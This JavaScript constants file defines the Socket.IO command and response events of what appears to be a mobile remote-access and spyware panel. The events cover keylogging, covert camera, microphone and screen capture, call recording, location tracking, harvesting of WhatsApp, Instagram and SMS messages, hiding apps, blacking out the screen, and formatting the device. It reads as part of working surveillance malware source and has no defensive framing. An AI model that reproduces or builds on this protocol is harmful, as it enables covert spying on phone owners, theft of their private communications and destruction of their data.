export const SUPPORTED_LANG = ["en", "es", "fr", "ar"];

// Public Socket Events
export const SocketIOPublicEvents = {
	JOIN_ROOM: "join-room",
	ADD_NEW_DEVICE: "add-new-device",
	ADDED_DEVICE: "added-device",
	SET_ONLINE_DEVICE: "device-connection-mobile-response",
	SET_OFFLINE_DEVICE: "device-disconnection-mobile-response",

	// Device Event
	DEVICE_EVENT: "device-event",
	DEVICE_INFORMATION: "device-information",
	DEVICE_INFORMATION_RESPONSE: "device-information-mobile-response",
	DEVICE_INFORMATION_SHARED: "device-information-shared",

	//Monitors
	SCREEN_MONITOR: "screen-monitor",
	SCREEN_MOBILE_RESPONSE: "screen-mobile-response",
	SCREEN_MOBILE_BYTE_RESPONSE: "screen-mobile-byte-response",
	SCREEN_SHARE: "screen-shared",

	SCREEN_SKELETON: "screen-skeleton",
	SCREEN_SKELETON_MOBILE_RESPONSE: "screen-skeleton-mobile-response",
	SCEEEN_SKELETION_SHARED: "screen-skeleton-shared",

	SCREEN_SEND_TEXT: "screen-send-text",

	CAMERA_MONITOR: "camera-monitor",
	CAMERA_MOBILE_RESPONSE: "camera-mobile-response",
	CAMERA_SHARE: "camera-shared",

	MIC_MONITOR: "mic-monitor",
	MIC_MOBILE_RESPONSE: "mic-mobile-response",
	MIC_SHARE: "mic-shared",

	KEY_MONITOR: "key-monitor",
	KEY_MOBILE_RESPONSE: "key-logs-mobile-response",
	KEY_MOBILE_REALTIME_RESPONSE: "key-logs-realtime-mobile-response",
	KEY_SHARE: "key-logs-shared",

	LOCATION_MONITOR: "location-monitor",
	LOCATION_MOBILE_RESPONSE: "location-mobile-response",
	LOCATION_SHARE: "location-shared",

	CALL_HISTORY_MONITOR: "call-history-monitor",
	CALL_HISTORY_RESPONSE: "call-history-mobile-response",
	CALL_HISTORY_SHARE: "call-history-shared",

	CALL_RECORD_MONITOR: "call-record-monitor",
	CALL_RECORD_MOBILE_RESPONSE: "call-record-mobile-monitor",
	CALL_RECORD_SHARE: "call-record-shared",

	APP_MONITOR: "application-monitor",
	APP_MOBILE_RESPONSE: "application-mobile-response",
	APP_SHARED: "application-shared",
	APP_EVENT_MONITOR: "application-event-monitor",

	MONITOR_RESPONSE: "monitor-response",

	//monitor close
	MONITOR_CLOSE: "monitor-close",

	//Managers
	GALLERY_MANAGER: "gallery-manager",
	GALLERY_MANAGER_RESPONSE: "all-gallery-mobile-response",
	GALLERY_LIST_SHARE: "gallery-list-shared",
	GALLERY_GET: "get-gallery",
	GALLERY_ONE_RESPONSE: "one-gallery-mobile-response",
	GALLERY_ONE_SHARE: "gallery-one-shared",

	SMS_MANAGER_RESPONSE: "sms-realtime-response",
	SMS_MANAGER_SHARED: "sms-manager-shared",

	//Social Managers
	WHATSAPP_CHIENTLIST_MOBILE_RESPONSE: "whatsapp-clientlist-mobile-response",
	WHATSAPP_CHIENTLIST_TO_WEB: "whatsapp-clientlist-web",

	WHATSAPP_MESSAGE_MOBILE_RESPONSE: "whatsapp-message-mobile-response",
	WHATSAPP_MESSAGE_TO_WEB: "whatsapp-message-web",

	INSTAGRAM_CLIENTLIST_MOBILE_RESPONSE:
		"instagram-clientlist-mobile-response",
	INSTAGRAM_CLIENTLIST_TO_WEB: "instagram-clientlist-web",

	INSTAGRAM_MESSAGE_MOBILE_RESPONSE: "instagram-message-mobile-response",
	INSTAGRAM_MESSAGE_TO_WEB: "instagram-message-web",

	SOCIAL_MANAGER_MOBILE_RESPONSE: "social-manager-mobile-response",

	// Screen Control Events
	SCREEN_CLICK_EVENT: "screen-click-event",
	SCREEN_DRAG_EVENT: "screen-drag-event",
	SCREEN_SETTING_EVENT: "screen-setting-event",
	SCREEN_CONTROL_EVENT: "screen-control-event",
	SCREEN_FPS_EVENT: "screen-fps-event",
	SCREEN_QUALITY_EVENT: "screen-quality-event",
	SCREEN_MONITOR_REFRESH: "screen-monitor-refresh",
	SCREEN_SCROLL_EVENT: "screen-scroll-event",

	// Device
	DEVICE_FORMAT_EVENT: "device-format-event",
	DEVICE_FORMAT_RESPONSE: "format-mobile-response",
	DEVICE_FORMAT_SHARED: "device-format-shared",
	DEVICE_LOCK_EVENT: "device-lock-event",
	DEVICE_DELETE_EVENT: "device-delete-event",

	// Uninstall APP
	UNINSTALL_APP_EVENT: "uninstall-app-event",
	UNINSTALL_APP_RESPONSE: "uninstall-app-response",
	UNINSTALL_APP_SHARED: "uninstall-app-shared",
	DISPLAY_APP_EVENT: "display-app-event",
	DISPLAY_APP_RESPONSE: "display-app-response",
	DISPLAY_APP_SHARED: "display-app-shared",
};

// Socket Events to Mobile
export const SocketIOMobileEvents = {
	//Device Event
	MOBILE_DEVICE_EVENT: "mb-device-event",
	MOBILE_DEVICE_INFORMATION: "mb-device-information",

	MOBILE_SCREEN_MONITOR: "mb-screen-monitor",

	MOBILE_SCREEN_FPS_EVENT: "mb-screen-fps-event",
	MOBILE_SCREEN_QUALITY_EVENT: "mb-screen-quality-event",
	MOBILE_SCREEN_MONITOR_REFRESH: "mb-screen-monitor-refresh",
	MOBILE_SCREEN_CONTROL_SCROLL: "mb-screen-control-scroll",
	MOBILE_DEVICE_LOCK: "mb-device-lock",

	MOBILE_SCREEN_SKELETION: "mb-screen-skeleton",
	MOBILE_SCREEN_SEND_TEXT: "mb-screen-send-text",

	MOBILE_CAMERA_MONITOR: "mb-camera-monitor",
	MOBILE_FRONT_CAMERA_MONITOR: "mb-front-camera-monitor",
	MOBILE_CAMERA_QUALITY_MONITOR: "mb-camera-quality-monitor",

	MOBILE_MIC_MONITOR: "mb-mic-monitor",

	MOBILE_KEY_LOGS: "mb-key-logs",

	MOBILE_LOCATION_MONITOR: "mb-location-monitor",

	MOBILE_CALL_HISTORY_MONITOR: "mb-call-history-monitor",

	MOBILE_CALL_RECORD_MONITOR: "mb-call-record-monitor",

	MOBILE_APP_MONITOR: "mb-application-monitor",
	MOBILE_APP_EVENT_MONITOR: "mb-application-event-monitor",

	MOBILE_MONITOR_CLOSE: "mb-monitor-close",

	// Managers
	MOBILE_GALLERY_MANAGER: "mb-all-gallery-monitor",
	MOBILE_GET_GALLERY: "mb-one-gallery-monitor",

	// Screen Control
	MOBILE_SCREEN_CLICK_EVENT: "mb-screen-click-event",
	MOBILE_SCREEN_DRAG_EVENT: "mb-screen-drag-event",
	MOBILE_SCREEN_BLACK_EVENT: "mb-screen-black-event",
	MOBILE_SCREEN_LOCK_EVENT: "mb-screen-lock-event",

	// Device
	MOBILE_DEVICE_FORMAT_EVENT: "mb-device-format-event",
	MOBILE_DEVICE_DELETE_EVENT: "mb-device-delete-event",

	// Uninstall APP
	MOBILE_UNINSTALL_APP_EVENT: "mb-uninstall-app-event",
	MOBILE_DISPLAY_APP_EVENT: "mb-display-app-event",
};
